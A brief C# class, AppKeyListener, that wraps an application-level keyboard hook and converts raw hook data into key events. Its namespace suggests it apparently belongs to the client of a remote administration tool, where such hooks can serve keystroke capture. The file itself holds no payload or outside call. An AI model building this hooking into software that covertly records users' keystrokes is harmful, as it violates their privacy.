using System.Collections.Generic;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation;

internal class AppKeyListener : KeyListener
{
	public AppKeyListener()
		: base(HookHelper.HookAppKeyboard)
	{
	}

	protected override IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data)
	{
		return KeyPressEventArgsExt.FromRawDataApp(data);
	}

	protected override KeyEventArgsExt GetDownUpEventArgs(CallbackData data)
	{
		return KeyEventArgsExt.FromRawDataApp(data);
	}
}
